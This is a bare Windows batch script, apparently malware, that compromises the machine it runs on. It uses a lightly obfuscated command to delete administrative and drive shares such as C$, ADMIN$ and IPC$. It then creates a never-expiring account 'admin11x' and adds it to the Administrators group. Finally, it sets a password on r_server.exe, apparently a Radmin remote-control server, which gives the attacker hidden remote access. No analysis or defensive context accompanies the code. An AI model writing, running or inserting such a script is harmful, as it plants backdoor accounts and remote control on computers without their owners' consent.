   @echo off
   set zer=share
   net %zer% h$ /delete /y
   net %zer% i$ /delete /y
   net %zer% j$ /delete /y
   net %zer% k$ /delete /y
   net %zer% l$ /delete /y
   net %zer% g$ /delete /y
   net %zer% c$ /delete /y
   net %zer% m$ /delete /y
   net %zer% n$ /delete /y
   net %zer% o$ /delete /y
   net %zer% p$ /delete /y
   net %zer% r$ /delete /y
   net %zer% ipc$ /delete /y
   net %zer% admin$ /delete /y
   net %zer% print$ /delete /y
   net %zer% d$ /delete /y
   net %zer% My Documents /delete /y
   net %zer% e$ /delete /y
   net %zer% f$ /delete /y
   net %zer% s$ /delete /y
   net %zer% t$ /delete /y
   net %zer% u$ /delete /y
   net %zer% z$ /delete /y
   net %zer% v$ /delete /y
   net %zer% w$ /delete /y
   net %zer% x$ /delete /y
   net %zer% y$ /delete /y
   net %zer% Shared Docs /delete /y
   net user admin11x admin11x /add /expires:never
   net localgroup administrators admin11x /add
   net localgroup users admin11x /delete
   r_server.exe /Stop
   r_server.exe /pass:ghost123
   r_server.exe /pass:ghost123
   exit
   exit
